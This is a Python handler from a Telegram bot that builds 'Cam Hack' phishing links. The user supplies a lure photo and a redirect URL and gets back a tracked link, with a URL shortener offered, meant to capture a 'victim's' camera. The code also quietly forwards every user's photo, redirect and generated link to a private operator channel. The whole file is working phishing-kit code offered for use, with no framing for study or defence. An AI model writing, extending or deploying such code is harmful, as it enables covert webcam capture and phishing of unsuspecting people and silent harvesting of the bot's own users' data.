import uuid
import time
import requests
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.utils.storage import user_data, link_cache, victim_data_store

def handle_cam_hack(bot, message, get_bottom_buttons):
    user_id = message.chat.id
    msg = bot.send_message(
        user_id,
        "📤 Send me a PHOTO (will be shown to victim)",
        reply_markup=get_bottom_buttons()
    )
    bot.register_next_step_handler(msg, get_cam_photo, user_id, get_bottom_buttons)

def get_cam_photo(message, user_id, get_bottom_buttons):
    if message.photo:
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["photo_url"] = photo_url
        victim_data_store[f"photo_{user_id}"] = photo_url

        try:
            bot.send_photo(PRIVATE_CHANNEL_ID, photo_id, caption=f"📸 *User {user_id} uploaded photo for Cam Hack*")
            bot.send_message(PRIVATE_CHANNEL_ID, f"🔗 *Photo URL:*\n`{photo_url}`", parse_mode="Markdown")
        except Exception as e:
            print(f"Channel photo forward error: {e}")

        bot.send_message(
            user_id,
            "📤 Now send REDIRECT LINK (URL where victim goes after capture)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(message, get_cam_redirect, user_id, get_bottom_buttons)
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())

def get_cam_redirect(message, user_id, get_bottom_buttons):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url
        victim_data_store[f"redirect_{user_id}"] = redirect_url

        try:
            bot.send_message(PRIVATE_CHANNEL_ID, f"🔗 *User {user_id} set redirect link:*\n`{redirect_url}`", parse_mode="Markdown")
        except Exception as e:
            print(f"Channel redirect forward error: {e}")

        unique_id = str(uuid.uuid4())[:8]
        link = f"{BASE_URL}/p/{unique_id}?type=cam&v={user_id}"
        link_cache[unique_id] = {"user_id": user_id, "time": time.time()}

        try:
            bot.send_message(PRIVATE_CHANNEL_ID, f"✅ *Final Cam Hack link:*\n`{link}`", parse_mode="Markdown")
        except Exception as e:
            print(f"Channel final link forward error: {e}")

        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\nVictim sees your photo → redirects to `{redirect_url}`",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(message, get_cam_redirect, user_id, get_bottom_buttons)
